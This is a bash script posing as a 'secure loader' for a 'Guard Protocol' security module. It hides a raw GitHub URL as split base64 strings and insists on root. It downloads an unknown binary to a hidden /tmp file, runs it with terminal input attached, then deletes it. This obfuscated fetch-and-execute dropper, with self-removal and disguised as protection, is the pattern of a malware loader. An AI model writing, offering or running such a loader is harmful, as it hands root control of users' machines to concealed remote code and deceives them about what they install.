#!/bin/bash
# ==========================================
# CRAEL V10 SECURE LOADER
# ==========================================



_x1="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3BsdW1zb2Z0d2FyZWRldi1iaXQv"

_x2="bG9wcHAvbWFpbi9pbnN0YWxsZXI="

GUARD_URL=$(echo "${_x1}${_x2}" | base64 -d)
TEMP_GUARD="/tmp/.crael_guard_$(date +%s)"

# --- UI COLORS ---
RESET="\033[0m"
GREEN="\033[38;5;46m"
MAGENTA="\033[38;5;213m"
BOLD="\033[1m"

clear
echo -e "${MAGENTA}${BOLD}   CRAEL V10 TITANIUM${RESET}"
echo -e "${GREEN}[*] Initializing Guard Protocol...${RESET}"

# --- ROOT CHECK ---
if [[ $EUID -ne 0 ]]; then
   echo "Error: Run as root."
   exit 1
fi

# --- DOWNLOAD GUARD (BINARY) ---
# Using wget/curl to fetch the binary executable
if command -v wget >/dev/null 2>&1; then
    wget -qO "$TEMP_GUARD" "$GUARD_URL"
else
    curl -sL -o "$TEMP_GUARD" "$GUARD_URL"
fi

# --- EXECUTION ---
if [ -s "$TEMP_GUARD" ]; then
    chmod +x "$TEMP_GUARD"
    
    # CRITICAL: Reconnect input to terminal so the binary menu works
    exec < /dev/tty
    
    # Run the Guard Binary
    "$TEMP_GUARD"
    
    # Self-Destruct the Guard file
    rm -f "$TEMP_GUARD"
else
    echo "Error: Failed to retrieve security module."
    echo "Debug: Check if 'installer' exists in the main branch of 'plumsoftwaredev-bit/loppp'."
    rm -f "$TEMP_GUARD"
    exit 1
fi
